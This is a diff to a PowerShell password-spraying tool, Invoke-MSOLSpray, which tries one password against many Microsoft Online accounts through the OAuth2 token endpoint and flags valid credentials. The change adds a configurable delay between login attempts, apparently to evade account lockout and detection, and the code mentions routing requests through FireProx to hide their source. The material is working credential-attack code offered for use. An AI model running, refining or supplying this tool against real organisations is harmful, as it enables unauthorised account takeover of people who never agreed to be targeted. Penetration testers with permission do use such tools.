@@ -1,4 +1,4 @@
-﻿function Invoke-MSOLSpray{
+function Invoke-MSOLSpray{
 
 <#
     .SYNOPSIS
@@ -21,6 +21,10 @@
         
         A single password that will be used to perform the password spray.
     
+    .PARAMETER Delay
+
+        A number in seconds to delay between requests.
+
     .PARAMETER OutFile
         
         A file to output valid results to.
@@ -62,6 +66,10 @@
     [string]
     $Password = "",
 
+    [Parameter(Position = 2, Mandatory = $False)]
+    [Int]
+    $Delay = 10,
+
     # Change the URL if you are using something like FireProx
     [Parameter(Position = 3, Mandatory = $False)]
     [string]
@@ -94,6 +102,9 @@
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
+        if ($Delay) {
+            Start-Sleep -Seconds $Delay
+        }
         $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
 
         # If we get a 200 response code it's a valid cred
